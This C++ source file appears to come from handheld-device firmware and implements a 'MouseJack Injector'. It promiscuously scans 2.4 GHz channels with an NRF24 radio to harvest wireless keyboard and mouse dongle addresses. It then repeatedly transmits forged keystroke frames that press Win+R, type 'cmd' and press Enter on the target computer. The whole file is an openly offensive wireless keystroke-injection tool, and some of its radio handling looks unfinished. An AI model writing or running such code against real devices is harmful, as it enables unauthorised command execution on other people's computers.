#include <Arduino.h>
#include "nrf_mousejack.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "nrf_common.h"

using namespace nrf_common;

#include <vector>

static std::vector<std::vector<uint8_t>> discovered_mj_macs;

void perform_promiscuous_mj_scan(NRF24_MODE mode) {
    discovered_mj_macs.clear();
    tft.fillRect(10, 70, tftWidth - 20, 20, willyConfig.bgColor);
    tft.setCursor(10, 70);
    tft.println("Scanning (Promisc)...");

    if (CHECK_NRF_SPI(mode)) {
        NRFradio.setAutoAck(false);
        NRFradio.disableCRC();
        NRFradio.setAddressWidth(3);
        uint8_t promisc_addr[3] = {0x00, 0x55, 0xAA};
        NRFradio.openReadingPipe(0, promisc_addr);
        NRFradio.startListening();
    }

    uint32_t scan_start = millis();
    int ch = 2;
    while(millis() - scan_start < 5000 && !check(EscPress)) {
        if (CHECK_NRF_SPI(mode)) {
            NRFradio.setChannel(ch);
            uint8_t pipe;
            if (NRFradio.available(&pipe)) {
                uint8_t buf[32];
                uint8_t len = NRFradio.getDynamicPayloadSize();
                if (len >= 5) {
                    NRFradio.read(buf, len);
                    std::vector<uint8_t> mac = {buf[0], buf[1], buf[2], buf[3], buf[4]};
                    if (discovered_mj_macs.size() < 10) discovered_mj_macs.push_back(mac);
                } else {
                    NRFradio.read(buf, len);
                }
            }
            ch += 5;
            if (ch > 80) ch = 2;
        }
        vTaskDelay(10);
    }

    if (CHECK_NRF_SPI(mode)) {
        NRFradio.stopListening();
        NRFradio.setAddressWidth(5);
        NRFradio.setCRCLength(RF24_CRC_16);
    }
}

void nrf_mousejack_injector() {
    NRF24_MODE mode = nrf_setMode();
    if (!nrf_start(mode)) {
        displayError("NRF24 not found");
        vTaskDelay(500 / portTICK_PERIOD_MS);
        return;
    }

    drawMainBorder();
    tft.setCursor(10, 35);
    tft.setTextSize(FM);
    tft.println("MouseJack Injector");

    if (CHECK_NRF_SPI(mode)) {
        NRFradio.setAutoAck(false);
        NRFradio.setPALevel(RF24_PA_MAX);
        NRFradio.setDataRate(RF24_2MBPS);
        NRFradio.setPayloadSize(10); // Standard mostly
        NRFradio.setChannel(25);      // Default channel scan start
    }

    perform_promiscuous_mj_scan(mode);

    if (discovered_mj_macs.empty()) {
        displayError("Nenhum alvo encontrado");
        vTaskDelay(2000 / portTICK_PERIOD_MS);
        return;
    }

    tft.fillRect(10, 70, tftWidth - 20, 20, willyConfig.bgColor);
    tft.setCursor(10, 70);
    tft.printf("Targets found: %d", discovered_mj_macs.size());

    int current_channel = 2;
    int current_addr_idx = 0;
    int injected_count = 0;

    // Sequence of payloads (e.g. GUI+R, cmd, Enter)
    uint8_t payloads[][10] = {
        {0x00, 0xC1, 0x08, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x00}, // GUI + R
        {0x00, 0xC1, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00}, // 'c'
        {0x00, 0xC1, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00}, // 'm'
        {0x00, 0xC1, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00}, // 'd'
        {0x00, 0xC1, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x00}  // Enter
    };

    uint32_t start_time = millis();
    int payload_idx = 0;
    while (!check(EscPress) && (millis() - start_time < 60000)) {
        // Scanning
        if (CHECK_NRF_SPI(mode)) {
            NRFradio.setChannel(current_channel);
            NRFradio.openWritingPipe(discovered_mj_macs[current_addr_idx].data());

            bool success = NRFradio.write(payloads[payload_idx], 10);
            if (success) {
                injected_count++;
                payload_idx = (payload_idx + 1) % 5;
                tft.fillRect(10, 90, tftWidth - 20, 20, willyConfig.bgColor);
                tft.setCursor(10, 90);
                tft.printf("Injected! Total: %d", injected_count);
            }

            current_channel += 2;
            if (current_channel > 80) {
                current_channel = 2;
                current_addr_idx = (current_addr_idx + 1) % discovered_mj_macs.size();
            }
        }

        if (CHECK_NRF_UART(mode) || CHECK_NRF_BOTH(mode)) {
            // Send placeholder command over UART if external
            NRFSerial.println("MJ_INJECT");
        }

        vTaskDelay(10 / portTICK_PERIOD_MS);
    }

    if (CHECK_NRF_UART(mode) || CHECK_NRF_BOTH(mode)) {
        NRFSerial.println("OFF");
    }
}
